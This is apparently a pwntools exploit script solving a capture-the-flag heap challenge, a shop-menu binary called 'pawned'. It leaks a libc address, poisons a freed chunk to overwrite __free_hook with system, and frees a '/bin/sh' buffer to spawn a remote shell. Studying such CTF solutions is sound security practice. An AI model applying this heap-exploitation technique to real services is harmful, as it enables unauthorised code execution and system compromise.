#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.ctf.games --port 31119 ./pawned
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pawned_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 31119)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# io.sendlineafter("> ","B")

libc= exe.libc

def sell(price,lenitem,nameitem):
    io.sendlineafter("> ","S")
    io.sendlineafter(": ",str(price))
    io.sendlineafter(": ",str(lenitem))
    io.sendlineafter(": ",str(nameitem))

def buy(idx):
    io.sendlineafter("> ","B")
    io.sendlineafter(": ",str(idx))

def print_item():
    io.sendlineafter("> ","P")

def manage(idx,price,lenitem,nameitem):
    io.sendlineafter("> ","m")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(price))
    io.sendlineafter(": ",str(lenitem))
    io.sendlineafter(": ",str(nameitem))

sell(0,0x440,"mantap")
sell(0,0x40,"mantap")
sell(0,0x40,"mantap")
sell(0,0x40,"/bin/sh\x00")

buy(1)

print_item()
io.recvuntil("Name: ")
data = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(data)
libc.address = data - libc.sym['__malloc_hook'] -0x70
print hex(libc.address)

free = libc.sym['__free_hook']

buy(2)
buy(3)
# buy(2)

manage(3,'+',0x40,p64(free))

sell(0,0x40,"junk")
# io.sendlineafter("> ","S")
# io.sendlineafter(": ",str(0))
sell(0,0x40,p64(libc.sym['system']))

buy(4)

# print_item()



io.interactive()

